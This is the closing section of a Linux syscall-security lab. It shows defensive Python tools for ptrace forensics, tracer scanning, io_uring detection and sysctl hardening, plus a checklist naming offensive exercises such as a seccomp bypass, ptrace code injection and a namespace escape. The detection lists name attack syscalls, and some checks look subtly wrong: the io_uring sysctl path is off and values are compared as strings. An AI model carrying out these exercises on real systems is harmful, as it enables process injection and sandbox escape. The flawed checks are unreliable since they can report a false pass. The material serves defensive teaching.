        r'a0=([0-9a-f]+).*?'
        r'a1=([0-9a-f]+)'
    )
    comm_pattern = re.compile(r'comm="([^"]+)"')
    exe_pattern = re.compile(r'exe="([^"]+)"')

    with open(logfile) as f:
        for line in f:
            if 'syscall=101' not in line:
                continue
            m = pattern.search(line)
            if not m:
                continue

            ts = datetime.fromtimestamp(int(m.group(1))).strftime("%H:%M:%S")
            tracer_pid = int(m.group(2))
            op_code = int(m.group(3), 16)
            target_pid = int(m.group(4), 16)

            if filter_pid and tracer_pid != filter_pid:
                continue

            comm_m = comm_pattern.search(line)
            exe_m = exe_pattern.search(line)
            comm = comm_m.group(1) if comm_m else None
            exe = exe_m.group(1) if exe_m else None

            if sessions[tracer_pid] is None:
                sessions[tracer_pid] = PtraceSession(tracer_pid)
            sessions[tracer_pid].add_event(ts, op_code, target_pid, comm, exe)

    return dict(sessions)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <audit.log> [tracer_pid]")
        sys.exit(1)

    logfile = sys.argv[1]
    filter_pid = int(sys.argv[2]) if len(sys.argv) > 2 else None

    sessions = parse_audit_log(logfile, filter_pid)

    if not sessions:
        print("[*] No ptrace sessions found in audit log")
    else:
        print(f"[*] Found {len(sessions)} ptrace sessions")
        for pid, session in sorted(sessions.items()):
            session.report()

#### Step 5.2: Live TracerPid Scanner

```python
#!/usr/bin/env python3
"""defensive/tracer_scanner.py
Continuously scan /proc for processes with non-zero TracerPid.
Usage: sudo python3 tracer_scanner.py [--interval 5]
"""
import os
import sys
import time
import re
from pathlib import Path

def scan_tracers():
    findings = []
    for entry in os.listdir("/proc"):
        if not entry.isdigit():
            continue
        pid = int(entry)
        try:
            status = Path(f"/proc/{pid}/status").read_text()
            tracer_m = re.search(r'^TracerPid:\s+(\d+)', status, re.M)
            if tracer_m and int(tracer_m.group(1)) > 0:
                name_m = re.search(r'^Name:\s+(.+)$', status, re.M)
                uid_m = re.search(r'^Uid:\s+(\d+)', status, re.M)

                tracer_pid = int(tracer_m.group(1))
                tracer_name = "?"
                try:
                    t_status = Path(f"/proc/{tracer_pid}/status").read_text()
                    tn = re.search(r'^Name:\s+(.+)$', t_status, re.M)
                    if tn: tracer_name = tn.group(1)
                except (FileNotFoundError, PermissionError):
                    tracer_name = "<exited>"

                findings.append({
                    "pid": pid,
                    "name": name_m.group(1) if name_m else "?",
                    "uid": int(uid_m.group(1)) if uid_m else -1,
                    "tracer_pid": tracer_pid,
                    "tracer_name": tracer_name,
                })
        except (FileNotFoundError, PermissionError):
            continue

    return findings

def check_rwx_maps(pid):
    try:
        maps = Path(f"/proc/{pid}/maps").read_text()
        rwx = [l for l in maps.splitlines() if "rwxp" in l]
        return rwx
    except (FileNotFoundError, PermissionError):
        return []

KNOWN_DEBUGGERS = {"gdb", "lldb", "strace", "ltrace", "valgrind", "rr"}

def main():
    interval = 5
    if "--interval" in sys.argv:
        idx = sys.argv.index("--interval")
        interval = int(sys.argv[idx + 1])

    print(f"[*] Scanning for traced processes every {interval}s")
    print(f"[*] Known debuggers (allowlisted): {', '.join(KNOWN_DEBUGGERS)}")
    print()

    seen = set()

    while True:
        findings = scan_tracers()
        for f in findings:
            key = (f["pid"], f["tracer_pid"])
            is_debugger = f["tracer_name"] in KNOWN_DEBUGGERS
            severity = "INFO" if is_debugger else "ALERT"

            if key not in seen or not is_debugger:
                rwx = check_rwx_maps(f["pid"])
                ts = time.strftime("%Y-%m-%d %H:%M:%S")
                print(f"[{ts}] [{severity}] PID {f['pid']} ({f['name']}) "
                      f"traced by PID {f['tracer_pid']} ({f['tracer_name']}) "
                      f"uid={f['uid']}")
                if rwx:
                    print(f"  [!] RWX mappings detected ({len(rwx)} regions):")
                    for r in rwx[:3]:
                        print(f"      {r}")
                seen.add(key)

        time.sleep(interval)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Scanner stopped")
```

---

## PART C: FRAMEWORK DEVELOPMENT

### SyscallGuard — Unified Syscall Security Framework

Build a reusable Python package that integrates all defensive capabilities from this lab.

#### Package Structure

```
framework/syscallguard/
├── setup.py
├── syscallguard/
│   ├── __init__.py
│   ├── cli.py              # CLI entry point
│   ├── audit_monitor.py    # Auditd log monitoring and analysis
│   ├── seccomp_audit.py    # Seccomp profile auditing
│   ├── tracer_scan.py      # TracerPid scanning
│   ├── sysctl_audit.py     # Sysctl hardening verification
│   ├── iouring_detect.py   # io_uring detection
│   └── report.py           # Report generation
```

#### setup.py

```python
# framework/syscallguard/setup.py
from setuptools import setup, find_packages

setup(
    name="syscallguard",
    version="1.0.0",
    description="Syscall-level security monitoring and hardening framework",
    packages=find_packages(),
    python_requires=">=3.8",
    entry_points={
        "console_scripts": [
            "syscallguard=syscallguard.cli:main",
        ],
    },
)
```

#### __init__.py

```python
# framework/syscallguard/syscallguard/__init__.py
__version__ = "1.0.0"
```

#### cli.py

```python
#!/usr/bin/env python3
# framework/syscallguard/syscallguard/cli.py
"""SyscallGuard CLI — unified syscall security framework."""
import argparse
import sys
import json
from datetime import datetime

from . import audit_monitor
from . import seccomp_audit
from . import tracer_scan
from . import sysctl_audit
from . import iouring_detect
from . import report


def cmd_monitor(args):
    """Real-time audit log monitoring."""
    audit_monitor.monitor(args.log, args.output)


def cmd_seccomp(args):
    """Audit seccomp profiles."""
    if args.profile:
        seccomp_audit.audit_profile(args.profile)
    elif args.pid:
        seccomp_audit.audit_process(args.pid)
    else:
        seccomp_audit.scan_all_processes()


def cmd_tracers(args):
    """Scan for traced processes."""
    tracer_scan.scan(interval=args.interval, once=args.once)


def cmd_harden(args):
    """Check and apply sysctl hardening."""
    if args.apply:
        sysctl_audit.apply_hardening()
    else:
        sysctl_audit.check_hardening()


def cmd_iouring(args):
    """Detect io_uring usage."""
    iouring_detect.scan(args.pid)


def cmd_report(args):
    """Generate comprehensive security report."""
    report.generate(args.output)


def main():
    parser = argparse.ArgumentParser(
        prog="syscallguard",
        description="Syscall-level security monitoring and hardening"
    )
    sub = parser.add_subparsers(dest="command")

    # monitor
    p = sub.add_parser("monitor", help="Real-time audit monitoring")
    p.add_argument("--log", default="/var/log/audit/audit.log")
    p.add_argument("--output", default=None, help="Output alerts to file")
    p.set_defaults(func=cmd_monitor)

    # seccomp
    p = sub.add_parser("seccomp", help="Seccomp profile audit")
    p.add_argument("--profile", help="JSON profile to audit")
    p.add_argument("--pid", type=int, help="Audit specific PID")
    p.set_defaults(func=cmd_seccomp)

    # tracers
    p = sub.add_parser("tracers", help="Scan for traced processes")
    p.add_argument("--interval", type=int, default=5)
    p.add_argument("--once", action="store_true")
    p.set_defaults(func=cmd_tracers)

    # harden
    p = sub.add_parser("harden", help="Sysctl hardening check/apply")
    p.add_argument("--apply", action="store_true", help="Apply hardening")
    p.set_defaults(func=cmd_harden)

    # iouring
    p = sub.add_parser("iouring", help="Detect io_uring usage")
    p.add_argument("--pid", type=int, help="Check specific PID")
    p.set_defaults(func=cmd_iouring)

    # report
    p = sub.add_parser("report", help="Generate security report")
    p.add_argument("--output", default="syscallguard_report.json")
    p.set_defaults(func=cmd_report)

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(1)

    args.func(args)
```

#### sysctl_audit.py

```python
# framework/syscallguard/syscallguard/sysctl_audit.py
"""Sysctl hardening verification and application."""
import os
import subprocess

HARDENING_CHECKS = [
    {
        "path": "/proc/sys/vm/unprivileged_userfaultfd",
        "expected": "0",
        "description": "userfaultfd restricted to CAP_SYS_PTRACE",
        "severity": "CRITICAL",
        "risk": "Unprivileged TOCTOU exploitation via userfaultfd",
        "remediation": "echo 0 > /proc/sys/vm/unprivileged_userfaultfd",
    },
    {
        "path": "/proc/sys/io_uring_disabled",
        "expected": "1",  # or "2" for maximum hardening
        "description": "io_uring disabled for unprivileged users",
        "severity": "CRITICAL",
        "risk": "Seccomp bypass and kernel exploit surface via io_uring",
        "remediation": "echo 1 > /proc/sys/io_uring_disabled",
    },
    {
        "path": "/proc/sys/kernel/yama/ptrace_scope",
        "expected": "1",  # minimum; 2 recommended
        "description": "Yama ptrace scope (1=restricted, 2=admin-only)",
        "severity": "HIGH",
        "risk": "Unrestricted ptrace enables process injection",
        "remediation": "echo 1 > /proc/sys/kernel/yama/ptrace_scope",
    },
    {
        "path": "/proc/sys/kernel/unprivileged_bpf_disabled",
        "expected": "1",
        "description": "Unprivileged eBPF disabled",
        "severity": "HIGH",
        "risk": "eBPF-based kernel info leaks and exploitation",
        "remediation": "echo 1 > /proc/sys/kernel/unprivileged_bpf_disabled",
    },
    {
        "path": "/proc/sys/kernel/perf_event_paranoid",
        "expected": "3",
        "description": "perf_event restricted (3=no access for non-root)",
        "severity": "MEDIUM",
        "risk": "Side-channel attacks via performance counters",
        "remediation": "echo 3 > /proc/sys/kernel/perf_event_paranoid",
    },
    {
        "path": "/proc/sys/kernel/kptr_restrict",
        "expected": "2",
        "description": "Kernel pointers hidden from non-root",
        "severity": "HIGH",
        "risk": "KASLR bypass via /proc/kallsyms",
        "remediation": "echo 2 > /proc/sys/kernel/kptr_restrict",
    },
    {
        "path": "/proc/sys/kernel/dmesg_restrict",
        "expected": "1",
        "description": "dmesg restricted to root",
        "severity": "MEDIUM",
        "risk": "Kernel info leaks via dmesg",
        "remediation": "echo 1 > /proc/sys/kernel/dmesg_restrict",
    },
    {
        "path": "/proc/sys/fs/suid_dumpable",
        "expected": "0",
        "description": "Core dumps disabled for setuid programs",
        "severity": "MEDIUM",
        "risk": "Credential leaks via core files",
        "remediation": "echo 0 > /proc/sys/fs/suid_dumpable",
    },
    {
        "path": "/proc/sys/kernel/kexec_load_disabled",
        "expected": "1",
        "description": "kexec disabled (prevent kernel replacement)",
        "severity": "HIGH",
        "risk": "Kernel replacement attacks",
        "remediation": "echo 1 > /proc/sys/kernel/kexec_load_disabled",
    },
]


def check_hardening():
    """Check all sysctl hardening settings."""
    print("=== Syscall Sysctl Hardening Audit ===\n")

    score = 0
    total = 0

    for check in HARDENING_CHECKS:
        total += 1
        try:
            with open(check["path"]) as f:
                current = f.read().strip()
        except FileNotFoundError:
            current = "N/A"

        passed = current >= check["expected"] if current != "N/A" else False
        if passed:
            score += 1

        status = "PASS" if passed else "FAIL"
        marker = "+" if passed else "!"

        print(f"[{marker}] [{status}] {check['description']}")
        print(f"    Path: {check['path']}")
        print(f"    Current: {current}, Expected: >= {check['expected']}")
        if not passed:
            print(f"    Severity: {check['severity']}")
            print(f"    Risk: {check['risk']}")
            print(f"    Fix: {check['remediation']}")
        print()

    pct = (score / total * 100) if total > 0 else 0
    print(f"Score: {score}/{total} ({pct:.0f}%)")
    if pct < 70:
        print("[!] HARDENING INSUFFICIENT — apply recommended settings")
    elif pct < 100:
        print("[*] Partial hardening — review remaining items")
    else:
        print("[+] All syscall hardening checks passed")

    return {"score": score, "total": total, "percentage": pct}


def apply_hardening():
    """Apply all sysctl hardening settings."""
    if os.geteuid() != 0:
        print("[!] Must run as root to apply hardening")
        return

    print("=== Applying Syscall Hardening ===\n")

    for check in HARDENING_CHECKS:
        try:
            with open(check["path"], "w") as f:
                f.write(check["expected"])
            print(f"[+] {check['path']} = {check['expected']}")
        except FileNotFoundError:
            print(f"[*] {check['path']} — not available on this kernel")
        except PermissionError:
            print(f"[!] {check['path']} — permission denied")

    print("\n[+] Hardening applied. Run 'syscallguard harden' to verify.")
```

#### iouring_detect.py

```python
# framework/syscallguard/syscallguard/iouring_detect.py
"""Detect io_uring usage across processes."""
import os
import re
from pathlib import Path


def check_process_iouring(pid):
    """Check if a process has io_uring file descriptors."""
    iouring_fds = []
    fdinfo_dir = f"/proc/{pid}/fdinfo"

    try:
        for fd_name in os.listdir(f"/proc/{pid}/fd"):
            fdinfo_path = f"{fdinfo_dir}/{fd_name}"
            try:
                content = Path(fdinfo_path).read_text()
                if "io_uring" in content.lower() or "IoUring" in content:
                    sq_size = re.search(r'SqSize:\s+(\d+)', content)
                    cq_size = re.search(r'CqSize:\s+(\d+)', content)
                    iouring_fds.append({
                        "fd": int(fd_name),
                        "sq_size": int(sq_size.group(1)) if sq_size else 0,
                        "cq_size": int(cq_size.group(1)) if cq_size else 0,
                        "raw": content[:200],
                    })
            except (FileNotFoundError, PermissionError):
                continue
    except (FileNotFoundError, PermissionError):
        pass

    return iouring_fds


def get_process_info(pid):
    """Get basic process information."""
    info = {"pid": pid, "name": "?", "uid": -1, "seccomp": 0}
    try:
        status = Path(f"/proc/{pid}/status").read_text()
        m = re.search(r'^Name:\s+(.+)$', status, re.M)
        if m: info["name"] = m.group(1)
        m = re.search(r'^Uid:\s+(\d+)', status, re.M)
        if m: info["uid"] = int(m.group(1))
        m = re.search(r'^Seccomp:\s+(\d+)', status, re.M)
        if m: info["seccomp"] = int(m.group(1))
    except (FileNotFoundError, PermissionError):
        pass
    return info


def scan(target_pid=None):
    """Scan for io_uring usage."""
    print("=== io_uring Detection Scan ===\n")

    # Check system-wide sysctl
    try:
        disabled = Path("/proc/sys/io_uring_disabled").read_text().strip()
        print(f"io_uring_disabled sysctl: {disabled}")
        if disabled == "0":
            print("[!] io_uring enabled for all users")
        elif disabled == "1":
            print("[*] io_uring disabled for unprivileged users")
        elif disabled == "2":
            print("[+] io_uring fully disabled")
    except FileNotFoundError:
        print("[*] io_uring_disabled sysctl not available (kernel < 6.0)")
    print()

    pids = [target_pid] if target_pid else [
        int(e) for e in os.listdir("/proc") if e.isdigit()
    ]

    found = 0
    for pid in pids:
        fds = check_process_iouring(pid)
        if fds:
            found += 1
            info = get_process_info(pid)
            seccomp_str = {0: "none", 1: "strict", 2: "filter"}.get(
                info["seccomp"], "unknown")

            print(f"[!] PID {pid} ({info['name']}) — io_uring ACTIVE")
            print(f"    UID: {info['uid']}, Seccomp: {seccomp_str}")
            for fd_info in fds:
                print(f"    FD {fd_info['fd']}: SQ={fd_info['sq_size']}, "
                      f"CQ={fd_info['cq_size']}")
            print()

    if found == 0:
        print("[+] No io_uring instances found")
    else:
        print(f"[!] Found {found} processes with active io_uring rings")
```

#### audit_monitor.py

```python
# framework/syscallguard/syscallguard/audit_monitor.py
"""Real-time audit log monitoring for syscall attacks."""
import re
import sys
import json
import subprocess
from collections import defaultdict, deque
from datetime import datetime

MONITORED_KEYS = {
    "io_uring_create", "io_uring_ops", "io_uring_reg",
    "ptrace_attach", "ptrace_seize", "ptrace_setregs",
    "ptrace_getregs", "ptrace_pokedata", "ptrace_poketext",
    "ptrace_syscall",
    "xprocess_read", "xprocess_write",
    "userfaultfd_create",
    "seccomp_op", "seccomp_prctl",
    "namespace_unshare", "namespace_setns", "clone3_ops",
    "kmod_load", "kmod_unload",
    "bpf_ops",
    "mmap_rwx", "mprotect_exec",
    "kexec", "perf_event",
}

def monitor(logfile, output_file=None):
    """Monitor audit log for syscall-level attacks."""
    print(f"[*] Monitoring {logfile}")
    print(f"[*] Watching for keys: {len(MONITORED_KEYS)} patterns")
    print()

    pid_history = defaultdict(lambda: deque(maxlen=50))
    alert_count = 0

    proc = subprocess.Popen(
        ["tail", "-F", logfile],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )

    try:
        for line in proc.stdout:
            if "SYSCALL" not in line:
                continue

            key_m = re.search(r'key="([^"]+)"', line)
            if not key_m:
                continue

            key = key_m.group(1)
            if key not in MONITORED_KEYS:
                continue

            pid_m = re.search(r'\bpid=(\d+)', line)
            comm_m = re.search(r'comm="([^"]+)"', line)
            uid_m = re.search(r'\buid=(\d+)', line)

            pid = pid_m.group(1) if pid_m else "?"
            comm = comm_m.group(1) if comm_m else "?"
            uid = uid_m.group(1) if uid_m else "?"

            ts = datetime.now().strftime("%H:%M:%S")
            pid_history[pid].append(key)

            severity = "HIGH" if key in {
                "ptrace_attach", "ptrace_seize", "userfaultfd_create",
                "io_uring_create", "kmod_load", "namespace_unshare",
                "xprocess_write", "mmap_rwx"
            } else "MEDIUM"

            alert_count += 1
            msg = f"[{ts}] [{severity}] {key}: pid={pid} ({comm}) uid={uid}"
            print(msg)

            if output_file:
                with open(output_file, "a") as f:
                    f.write(msg + "\n")

    except KeyboardInterrupt:
        proc.terminate()
        print(f"\n[*] Stopped. Total alerts: {alert_count}")
```

#### seccomp_audit.py

```python
# framework/syscallguard/syscallguard/seccomp_audit.py
"""Seccomp profile auditing."""
import json
import os
import re
from pathlib import Path

ATTACK_SURFACE = {
    "io_uring_setup": "CRITICAL", "io_uring_enter": "CRITICAL",
    "io_uring_register": "HIGH", "ptrace": "HIGH",
    "process_vm_readv": "HIGH", "process_vm_writev": "CRITICAL",
    "userfaultfd": "CRITICAL", "mount": "CRITICAL",
    "pivot_root": "CRITICAL", "unshare": "HIGH",
    "setns": "HIGH", "init_module": "CRITICAL",
    "finit_module": "CRITICAL", "kexec_load": "CRITICAL",
    "bpf": "HIGH",
}

def audit_profile(profile_path):
    with open(profile_path) as f:
        profile = json.load(f)
    print(f"Auditing: {profile_path}")
    allowed = set()
    for entry in profile.get("syscalls", []):
        if entry.get("action") == "SCMP_ACT_ALLOW":
            allowed.update(entry.get("names", []))
    issues = 0
    for sc, sev in sorted(ATTACK_SURFACE.items()):
        if sc in allowed:
            print(f"  [!] [{sev}] {sc} is ALLOWED")
            issues += 1
    if issues == 0:
        print("  [+] No attack-surface syscalls allowed")

def audit_process(pid):
    try:
        status = Path(f"/proc/{pid}/status").read_text()
        m = re.search(r'^Seccomp:\s+(\d+)', status, re.M)
        mode = int(m.group(1)) if m else 0
        f_m = re.search(r'^Seccomp_filters:\s+(\d+)', status, re.M)
        filters = int(f_m.group(1)) if f_m else 0
        print(f"PID {pid}: mode={mode}, filters={filters}")
    except (FileNotFoundError, PermissionError):
        print(f"Cannot access PID {pid}")

def scan_all_processes():
    modes = {0: 0, 1: 0, 2: 0}
    for entry in os.listdir("/proc"):
        if entry.isdigit():
            try:
                s = Path(f"/proc/{entry}/status").read_text()
                m = re.search(r'^Seccomp:\s+(\d+)', s, re.M)
                if m: modes[int(m.group(1))] = modes.get(int(m.group(1)), 0) + 1
            except (FileNotFoundError, PermissionError):
                continue
    print(f"Seccomp modes: disabled={modes[0]}, strict={modes[1]}, filter={modes[2]}")
```

#### tracer_scan.py

```python
# framework/syscallguard/syscallguard/tracer_scan.py
"""Scan for processes with active ptrace tracers."""
import os
import re
import time
from pathlib import Path

KNOWN_DEBUGGERS = {"gdb", "lldb", "strace", "ltrace", "valgrind", "rr"}

def scan(interval=5, once=False):
    print("[*] Scanning for traced processes...")
    while True:
        for entry in os.listdir("/proc"):
            if not entry.isdigit():
                continue
            try:
                status = Path(f"/proc/{entry}/status").read_text()
                m = re.search(r'^TracerPid:\s+(\d+)', status, re.M)
                if m and int(m.group(1)) > 0:
                    tracer_pid = int(m.group(1))
                    name_m = re.search(r'^Name:\s+(.+)$', status, re.M)
                    name = name_m.group(1) if name_m else "?"

                    tracer_name = "?"
                    try:
                        ts = Path(f"/proc/{tracer_pid}/status").read_text()
                        tn = re.search(r'^Name:\s+(.+)$', ts, re.M)
                        if tn: tracer_name = tn.group(1)
                    except (FileNotFoundError, PermissionError):
                        pass

                    severity = "INFO" if tracer_name in KNOWN_DEBUGGERS else "ALERT"
                    print(f"[{severity}] PID {entry} ({name}) traced by "
                          f"PID {tracer_pid} ({tracer_name})")
            except (FileNotFoundError, PermissionError):
                continue
        if once:
            break
        time.sleep(interval)
```

#### report.py

```python
# framework/syscallguard/syscallguard/report.py
"""Generate comprehensive security report."""
import json
from datetime import datetime
from . import sysctl_audit, iouring_detect, seccomp_audit, tracer_scan

def generate(output_path):
    report = {
        "timestamp": datetime.now().isoformat(),
        "framework": "SyscallGuard v1.0.0",
        "checks": {}
    }

    print("=== SyscallGuard Security Report ===\n")

    # Sysctl hardening
    print("[1/4] Checking sysctl hardening...")
    result = sysctl_audit.check_hardening()
    report["checks"]["sysctl"] = result

    # Seccomp coverage
    print("\n[2/4] Scanning seccomp coverage...")
    seccomp_audit.scan_all_processes()

    # io_uring detection
    print("\n[3/4] Detecting io_uring usage...")
    iouring_detect.scan()

    # Tracer detection
    print("\n[4/4] Scanning for active tracers...")
    tracer_scan.scan(once=True)

    with open(output_path, 'w') as f:
        json.dump(report, f, indent=2)
    print(f"\n[+] Report saved to {output_path}")
```

### Installation and Usage

```bash
cd ~/syscall_lab/framework/syscallguard
pip install -e .

# Run individual checks
sudo syscallguard harden          # Check sysctl hardening
sudo syscallguard seccomp         # Scan seccomp coverage
sudo syscallguard tracers --once  # Check for traced processes
sudo syscallguard iouring         # Detect io_uring usage
sudo syscallguard monitor         # Real-time audit monitoring

# Apply hardening
sudo syscallguard harden --apply

# Generate full report
sudo syscallguard report --output /tmp/syscall_security_report.json
```

---

## Lab Validation Checklist

### Offensive Exercises Verification

| # | Exercise | Verification Command | Expected Result |
|---|----------|---------------------|-----------------|
| 1 | Syscall Dispatch | `./syscall_entry_explorer` | Both native and int 0x80 paths produce output; register dump shows RCX/R11 |
| 2a | Raw Seccomp | `./raw_seccomp_sandbox errno` | getpid() returns EPERM; write() works |
| 2b | Arch Bypass | `./seccomp_arch_bypass` | Native write blocked; int 0x80 write succeeds |
| 2c | libseccomp | `./libseccomp_sandbox` | All 5 tests pass: write OK, execve blocked, readonly OK, write blocked, RWX blocked |
| 3 | io_uring Bypass | `./iouring_seccomp_bypass` | Direct openat blocked; io_uring openat succeeds |
| 4 | userfaultfd TOCTOU | `./userfaultfd_toctou` | Fault handler intercepts, race window measured |
| 5a | ptrace Injection | `./ptrace_injector <pid>` | Target prints "INJECTED"; all 7 phases logged |
| 5b | Syscall Redirect | `./ptrace_syscall_redirect <pid>` | mmap forced in target; address reported |
| 6 | Cross-Process Mem | `./cross_process_mem <pid> <addr>` | Memory read succeeds (same-UID target) |
| 7 | Seccomp Enum | `sudo python3 seccomp_enum.py` | All processes categorized by seccomp mode |
| 8 | Namespace Escape | `./namespace_escape_demo.sh` | Reports whether namespace ops are blocked/allowed |

### Defensive Exercises Verification

| # | Exercise | Verification Command | Expected Result |
|---|----------|---------------------|-----------------|
| 1 | Audit Rules | `auditctl -l \| wc -l` | 20+ rules active |
| 1 | Audit Analyzer | Run offensive exercise, check alerts | Analyzer detects attack patterns |
| 2 | bpftrace Probes | `tmux attach -t syscall_monitor` | 4 panes with active probes |
| 3 | Seccomp Profiler | `python3 seccomp_profiler.py audit <profile>` | Attack surface report generated |
| 4 | Sysctl Hardening | `sudo ./deploy_sysctl_hardening.sh` | All 9 settings applied |
| 5a | ptrace Forensics | `sudo python3 ptrace_forensics.py audit.log` | Session reconstructed with attack pattern detection |
| 5b | TracerPid Scanner | `sudo python3 tracer_scanner.py --once` | Reports any traced processes |

### Cross-Verification Matrix

| Offensive Exercise | Detected By (Defensive) |
|---|---|
| Ex 2b (arch bypass) | Audit rules (seccomp_prctl), Seccomp profiler audit |
| Ex 3 (io_uring bypass) | bpftrace probe #2, Audit rule (io_uring_create), iouring_detect |
| Ex 4 (userfaultfd) | bpftrace probe #3, Audit rule (userfaultfd_create), Audit analyzer |
| Ex 5 (ptrace injection) | bpftrace probe #1, Audit rules (ptrace_*), TracerPid scanner, ptrace forensics |
| Ex 5b (syscall redirect) | bpftrace probe #1, Audit rules (ptrace_syscall + ptrace_setregs) |
| Ex 6 (cross-process mem) | bpftrace probe #3, Audit rules (xprocess_read/write) |
| Ex 8 (namespace escape) | Audit rules (namespace_unshare, clone3_ops) |

### Framework Verification

```bash
# Full framework test
sudo syscallguard report --output /tmp/test_report.json
cat /tmp/test_report.json | python3 -m json.tool

# Verify all subcommands
syscallguard --help
syscallguard harden --help
syscallguard seccomp --help
syscallguard monitor --help
syscallguard tracers --help
syscallguard iouring --help
syscallguard report --help
```

### Hardening Verification (Post-Lab)

```bash
# Verify hardening persists across reboot
cat /etc/sysctl.d/99-syscall-hardening.conf

# Verify attack surfaces are restricted
cat /proc/sys/vm/unprivileged_userfaultfd   # Should be 0
cat /proc/sys/io_uring_disabled             # Should be 1 or 2
cat /proc/sys/kernel/yama/ptrace_scope      # Should be >= 1
cat /proc/sys/kernel/unprivileged_bpf_disabled  # Should be 1

# Reset Yama scope if changed for exercises
echo 1 > /proc/sys/kernel/yama/ptrace_scope
```
